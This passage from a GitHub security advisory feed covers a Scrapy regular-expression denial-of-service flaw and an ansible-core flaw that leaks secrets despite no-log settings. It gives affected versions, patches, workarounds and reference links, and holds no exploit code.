<li><p>The <a href="https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.spiders.XMLFeedSpider"><code>XMLFeedSpider</code></a> class or any subclass that uses the default node iterator: <code>iternodes</code>, as well as direct uses of the <code>scrapy.utils.iterators.xmliter</code> function.</p>
</li>
<li><p><strong>Scrapy 2.6.0 to 2.11.0</strong>: The <a href="https://docs.scrapy.org/en/latest/topics/debug.html#scrapy.utils.response.open_in_browser"><code>open_in_browser</code></a> function for a response without a <a href="https://www.w3schools.com/tags/tag_base.asp">base tag</a>.</p>
</li>
</ul>
<p>Handling a malicious response could cause extreme CPU and memory usage during the parsing of its content, due to the use of vulnerable regular expressions for that parsing.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to Scrapy 2.11.1.</p>
<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.11.1 is not an option, you may upgrade to Scrapy 1.8.4 instead.</p>
<h3 id="workarounds">Workarounds</h3>
<p>For <code>XMLFeedSpider</code>, switch the node iterator to <code>xml</code> or <code>html</code>.</p>
<p>For <code>open_in_browser</code>, before using the function, either manually review the response content to discard a ReDos attack or manually define the base tag to avoid its automatic definition by <code>open_in_browser</code> later.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>This security issue was reported by @nicecatch2000  <a href="https://huntr.com/bounties/271f94f2-1e05-4616-ac43-41752389e26b/">through huntr.com</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scrapy/scrapy/security/advisories/GHSA-cc65-xxvf-f7r9">https://github.com/scrapy/scrapy/security/advisories/GHSA-cc65-xxvf-f7r9</a></li>
<li><a href="https://docs.scrapy.org/en/latest/news.html#scrapy-1-8-4-2024-02-14">https://docs.scrapy.org/en/latest/news.html#scrapy-1-8-4-2024-02-14</a></li>
<li><a href="https://docs.scrapy.org/en/latest/news.html#scrapy-2-11-1-2024-02-14">https://docs.scrapy.org/en/latest/news.html#scrapy-2-11-1-2024-02-14</a></li>
<li><a href="https://github.com/scrapy/scrapy/commit/479619b340f197a8f24c5db45bc068fb8755f2c5">https://github.com/scrapy/scrapy/commit/479619b340f197a8f24c5db45bc068fb8755f2c5</a></li>
<li><a href="https://github.com/scrapy/scrapy/commit/73e7c0ed011a0565a1584b8052ec757b54e5270b">https://github.com/scrapy/scrapy/commit/73e7c0ed011a0565a1584b8052ec757b54e5270b</a></li>
<li><a href="https://github.com/advisories/GHSA-cc65-xxvf-f7r9">https://github.com/advisories/GHSA-cc65-xxvf-f7r9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cc65-xxvf-f7r9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-02-15T15:22:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ansible-core] Ansible-core information disclosure flaw]]></title>
        <id>https://github.com/advisories/GHSA-h24r-m9qc-pvpg</id>
        <link href="https://github.com/advisories/GHSA-h24r-m9qc-pvpg"/>
        <updated>2024-02-14T14:57:22.000Z</updated>
        <content type="html"><![CDATA[<p>An information disclosure flaw was found in ansible-core due to a failure to respect the <code>ANSIBLE_NO_LOG</code> configuration in some scenarios. It was discovered that information is still included in the output in certain tasks, such as loop items. Depending on the task, this issue may include sensitive information, such as decrypted secret values.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-0690">https://nvd.nist.gov/vuln/detail/CVE-2024-0690</a></li>
<li><a href="https://github.com/ansible/ansible/pull/82565">https://github.com/ansible/ansible/pull/82565</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-0690">https://access.redhat.com/security/cve/CVE-2024-0690</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2259013">https://bugzilla.redhat.com/show_bug.cgi?id=2259013</a></li>
<li><a href="https://github.com/ansible/ansible/commit/6935c8e303440addd3871ecf8e04bde61080b032">https://github.com/ansible/ansible/commit/6935c8e303440addd3871ecf8e04bde61080b032</a></li>
<li><a href="https://github.com/ansible/ansible/commit/78db3a3de6b40fb52d216685ae7cb903c609c3e1">https://github.com/ansible/ansible/commit/78db3a3de6b40fb52d216685ae7cb903c609c3e1</a></li>
<li><a href="https://github.com/ansible/ansible/commit/b9a03bbf5a63459468baf8895ff74a62e9be4532">https://github.com/ansible/ansible/commit/b9a03bbf5a63459468baf8895ff74a62e9be4532</a></li>
<li><a href="https://github.com/ansible/ansible/commit/beb04bc2642c208447c5a936f94310528a1946b1">https://github.com/ansible/ansible/commit/beb04bc2642c208447c5a936f94310528a1946b1</a></li>
<li><a href="https://access.redhat.com/errata/RHSA-2024:0733">https://access.redhat.com/errata/RHSA-2024:0733</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/ansible-core/PYSEC-2024-36.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/ansible-core/PYSEC-2024-36.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-h24r-m9qc-pvpg">https://github.com/advisories/GHSA-h24r-m9qc-pvpg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h24r-m9qc-pvpg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-06T12:30:31.000Z</published>
    </entry>
</feed>